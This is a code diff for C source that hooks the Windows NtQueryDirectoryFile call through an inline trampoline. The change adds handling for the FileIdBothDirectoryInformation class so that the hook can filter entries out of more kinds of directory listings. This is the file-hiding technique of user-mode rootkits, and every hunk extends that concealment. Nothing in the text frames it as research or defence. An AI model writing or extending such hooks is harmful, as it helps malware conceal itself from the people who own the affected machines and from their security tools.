@@ -7,8 +7,9 @@
 #define TRAMP_SIZE  32
 #define JMP_SIZE    12
 
-#define FileDirectoryInformation_    1
-#define FileBothDirectoryInformation_ 3
+#define FileDirectoryInformation_         1
+#define FileBothDirectoryInformation_     3
+#define FileIdBothDirectoryInformation_  37
 #define STATUS_NO_MORE_FILES_ ((NTSTATUS)0x80000006L)
 
 typedef NTSTATUS (NTAPI *pNtQueryDirectoryFile)(
@@ -27,7 +28,11 @@ static BYTE                   g_saved[PATCH_SIZE];
 static void get_entry_name(BYTE *entry, ULONG info_class,
                            WCHAR **name, ULONG *name_len)
 {
-    if (info_class == FileBothDirectoryInformation_) {
+    if (info_class == FileIdBothDirectoryInformation_) {
+        FILE_ID_BOTH_DIR_INFORMATION *e = (FILE_ID_BOTH_DIR_INFORMATION *)entry;
+        *name     = e->FileName;
+        *name_len = e->FileNameLength;
+    } else if (info_class == FileBothDirectoryInformation_) {
         FILE_BOTH_DIR_INFORMATION *e = (FILE_BOTH_DIR_INFORMATION *)entry;
         *name     = e->FileName;
         *name_len = e->FileNameLength;
@@ -68,7 +73,8 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFile(
         return status;
 
     if (FileInformationClass != FileDirectoryInformation_ &&
-        FileInformationClass != FileBothDirectoryInformation_)
+        FileInformationClass != FileBothDirectoryInformation_ &&
+        FileInformationClass != FileIdBothDirectoryInformation_)
         return status;
 
     BYTE *buf  = (BYTE *)FileInformation;
